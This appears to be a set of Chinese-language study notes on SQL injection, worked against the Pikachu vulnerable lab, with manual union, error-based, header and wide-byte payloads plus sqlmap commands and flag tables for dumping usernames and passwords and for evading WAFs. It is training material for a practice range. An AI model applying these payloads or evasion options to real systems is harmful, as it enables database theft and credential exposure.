sql注入

每一个都用手动和工具注入

## pikachu

### 数字型注入

首先要知道数据库的操作：

- select * from user where id = '1'

- select * from user where id = "1"

- select * from user where id = 1

1. 判断闭合方式

   输入1’ 1“都报错说明是无引号包裹，如果有引号包裹还需要闭合前引号注释后引号(测试的时候那个报错说明闭合方式是哪个)

2. 判断是否存在注入点

   永真永假条件下返回不一样说明系统真的使用了你的输入，表示可以注入

3. 猜测查询列数

   order by 1  order by 2 order by 3，为后面的联合查询铺路

4. union操作判断回显位置

   `id=-1 union select 1,2`

5. 爆关键信息

   爆库、用户、版本号、表、列、字段值

   id = -1 union select database(),user()    version()

6. 爆表

   `-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu'`

   `id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users'`

   `-1 union select username,password from users`

### 字符型

这个语句应该是selece * from table where name = "$name" 需要闭合引号

PIKACHU payload `1' and 1=1 #`

### 搜索型

这个语句应该是select * from table where name like "%$name%"  一般要闭合%和引号

payload `-1%' and 1=1#`

### xx型

我知道了，看报错：`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'')' `

`''1'')'`输入的内容是`1'`,这就可以直接看出闭合方式了，最外层的单引号是表示这个字符串，里面的`'1'')`表示的是1’输进去后与后端的sql语句拼成的样子，说明需要闭合引号和小括号注释掉后面的`')`

### insert/update注入（报错注入）

主要通过updatexml()和extractvalue()对xpath文本进行报错注入，显示报错信息，这两个函数都有最多32个字符的限制，所以有时候需要substr

payload:`username=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu')),0) or '`

`username=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users')),0) or '`

`username=1' and updatexml(1,concat(0x7e,(select group_concat(username,password) from users)),0) or '`

### delete注入

`id=56+and+updatexml(1,+concat(0x7e,database()),1)`,这个是get请求，空格使用+表示

### http头注入

`1' or updatexml(1,concat(0x7e,database()),0) or '`,这个页面上出现了User-Agent的信息，直接从这里下手

### 宽字节注入

后端对单引号做了转义处理，给单引号增加反斜杠，'变成 `\'`,阻止单引号闭合

原理就是通过构造，把\与输入的内容拼接，从而吃掉转义符\，

payload:`test%df'`变成`test%df\'`,`%df\` 就被视为一个字符

payload:`name=1%df' or 1=1#`

#### 报错注入原理（直接获取数据，最常用）

由于`Insert`操作不返回查询结果，优先使用**MySQL 报错注入**（利用 MySQL 的报错函数，将敏感数据通过报错信息返回），核心依赖两个函数：

- `updatexml()`：MySQL XML 函数，语法错误时会返回错误信息，可嵌入查询语句获取敏感数据；
- `extractvalue()`：与`updatexml()`功能类似，报错长度有限制（约 32 个字符）；
- 核心语法：`恶意输入' and 报错函数(1, (查询语句)) #`，通过单引号破坏`INSERT`语法，触发报错并返回查询结果。

### 盲注

没有回显的时候使用的方法

1. 报错注入
2. 布尔注入
3. 延时注入

[pikachu靶场通关教程（四）——SQL注入 – 向女王展示自己的忠诚！挥舞！手中的利剑！！！](https://warspitesaiko.cc/range/pikachu/p4/)

## sqlmap的使用

`python3 sqlmap.py -u"地址" --data"参数值" --dbms mysql --dbs --batch -f`

--batch  自动执行 -f 指纹识别 --dbms mysql 指定数据库类型是mysql

重点的是爆数据库名：--dbs  表名 --tables  列名 --columns 

1. 枚举所有数据库

   ```bash
   python2 sqlmap.py -u "目标URL" --data "id=1&submit=查询" --dbms mysql --dbs --batch
   ```

   

2. 枚举 pikachu 库下所有表

   ```bash
   python2 sqlmap.py -u "目标URL" --data "id=1&submit=查询" --dbms mysql -D pikachu --tables --batch
   ```

   

3. 枚举 users 表下所有列

   ```bash
   python2 sqlmap.py -u "目标URL" --data "id=1&submit=查询" --dbms mysql -D pikachu -T users --cols --batch
   ```

   

4. 提取 username 和 password 列数据

   ```bash
   python2 sqlmap.py -u "目标URL" --data "id=1&submit=查询" --dbms mysql -D pikachu -T users -C username,password --dump --batch
   ```

#### 一、 基础定位类（注入前置，确定目标入口）

这类参数用于指定注入目标的 URL、请求参数等，是所有 SQLmap 命令的基础

| 参数           | 简写 | 核心含义 / 作用                                              |
| -------------- | ---- | ------------------------------------------------------------ |
| `--url`        | `-u` | 指定目标注入 URL（如 `http://192.168.139.130/pikachu/vul/sqli/sqli_id.php`），是必选参数之一 |
| `--data`       | 无   | 指定 POST 请求的参数（键值对格式，如 `id=1&submit=查询`），用于 POST 型注入点（你之前的命令中用到） |
| `--method`     | 无   | 指定请求方法（如 `GET`/`POST`/`PUT`），默认自动识别，复杂场景可手动指定 |
| `--cookie`     | 无   | 携带 Cookie 信息（如登录后的会话 Cookie），用于需要登录才能访问的注入点 |
| `--user-agent` | 无   | 自定义 User-Agent 头，绕过简单的 UA 过滤                     |
| `--referer`    | 无   | 自定义 Referer 头，模拟正常的页面跳转请求                    |

#### 二、 数据库环境探测类（确认目标数据库特性）

这类参数用于探测数据库的类型、版本等底层信息，为后续注入适配环境

| 参数            | 简写 | 核心含义 / 作用                                              |
| --------------- | ---- | ------------------------------------------------------------ |
| `--fingerprint` | `-f` | 开启数据库指纹识别，获取**详细底层信息**（版本、编译环境、架构、补丁版本等），比普通探测更精准 |
| `--dbms`        | 无   | 手动指定目标数据库类型（如 `--dbms mysql`、`--dbms sqlserver`），跳过自动探测，提升效率 |
| `--os`          | 无   | 手动指定目标服务器操作系统（如 `--os linux`、`--os windows`），适配不同系统的注入特性 |
| `--version`     | `-v` | 显示 SQLmap 版本信息，同时可指定日志详细级别（如 `-v 3` 显示详细注入过程，`-v 5` 显示调试信息） |

#### 三、 数据库枚举类（核心！获取库 / 表 / 列信息）

这类参数是你重点关注的，对应手工注入中查库、查表、查列的流程，按「全局→局部」排序

| 参数          | 简写     | 核心含义 / 作用                                              |
| ------------- | -------- | ------------------------------------------------------------ |
| `--databases` | `--dbs`  | 枚举目标数据库服务器上的**所有数据库名称**（包括系统库 + 业务库，如 `information_schema`、`pikachu`） |
| `--database`  | `-D`     | 手动指定**单个目标数据库**（如 `-D pikachu`），后续操作（查表 / 列）均针对该库，需配合`--dbs`使用 |
| `--tables`    | 无       | 枚举指定数据库下的**所有数据表名称**（如 `pikachu` 库下的 `users`、`login` 表），需配合 `-D` 使用 |
| `--table`     | `-T`     | 手动指定**单个目标数据表**（如 `-T users`），后续操作（查列 / 数据）均针对该表，需配合 `-D` 使用 |
| `--columns`   | `--cols` | 枚举指定数据表下的**所有数据列名称**（如 `users` 表下的 `id`、`username`、`password` 列），需配合 `-D`、`-T` 使用 |
| `--column`    | `-C`     | 手动指定**单个 / 多个目标数据列**（如 `-C username,password`），后续提取数据仅针对这些列，需配合 `-D`、`-T` 使用 |
| `--schema`    | 无       | 枚举目标数据库的完整架构（包括所有库、表、列、字段类型、主键等），一次性获取全量元数据 |

#### 四、 数据提取类（注入核心目的，获取敏感数据）

这类参数用于从指定的库 / 表 / 列中提取实际数据（如用户名、密码等）

| 参数               | 简写 | 核心含义 / 作用                                              |
| ------------------ | ---- | ------------------------------------------------------------ |
| `--dump`           | 无   | 提取指定库 / 表 / 列的**全部数据**（如 `--dump -D pikachu -T users -C username,password` 提取用户账号密码） |
| `--dump-all`       | 无   | 提取目标数据库服务器上**所有数据库的所有数据**（慎用，数据量较大，适合全量脱库） |
| `--limit`          | 无   | 限制提取数据的行数（如 `--limit 10` 仅提取前 10 条数据），避免数据量过大 |
| `--where`          | 无   | 添加查询条件，精准提取数据（如 `--where "id>10"` 仅提取 id 大于 10 的用户数据） |
| `--start`/`--stop` | 无   | 指定提取数据的行范围（如 `--start 5 --stop 15` 提取第 5-15 行数据） |

#### 五、 自动执行类（简化操作，无人值守）

这类参数用于跳过交互提示、自动执行注入流程，提升效率

| 参数             | 简写 | 核心含义 / 作用                                              |
| ---------------- | ---- | ------------------------------------------------------------ |
| `--batch`        | 无   | 开启批量自动执行模式，**跳过所有交互提示**，自动选择默认选项（如是否继续探测、是否保存结果），实现无人值守 |
| `--random-agent` | 无   | 自动随机生成 User-Agent 头，模拟不同浏览器的请求，绕过简单的 UA 黑名单 |
| `--threads`      | `-t` | 指定注入线程数（如 `-t 5` 开启 5 线程），提升枚举和数据提取的速度（线程数不宜过高，避免被 WAF 拦截） |

#### 六、 辅助绕过类（应对 WAF / 过滤规则）

这类参数用于绕过目标的 WAF 防护、关键字过滤等，提升注入成功率

| 参数         | 简写 | 核心含义 / 作用                                              |
| ------------ | ---- | ------------------------------------------------------------ |
| `--tamper`   | 无   | 加载篡改脚本，对 Payload 进行变形（如大小写混淆、关键字插入空格等），绕过 WAF 过滤（如 `--tamper space2comment.py` 用注释替换空格） |
| `--proxy`    | 无   | 通过代理服务器进行注入（如 `--proxy http://127.0.0.1:8080`），隐藏自身 IP，同时可配合 Burp Suite 抓包分析 |
| `--delay`    | 无   | 设置请求延迟时间（如 `--delay 2` 每次请求间隔 2 秒），避免请求过于频繁被 WAF 拦截 |
| `--safe-url` | 无   | 指定安全 URL，每隔一定请求数访问一次安全 URL，模拟正常浏览行为，绕过 WAF 的频率检测 |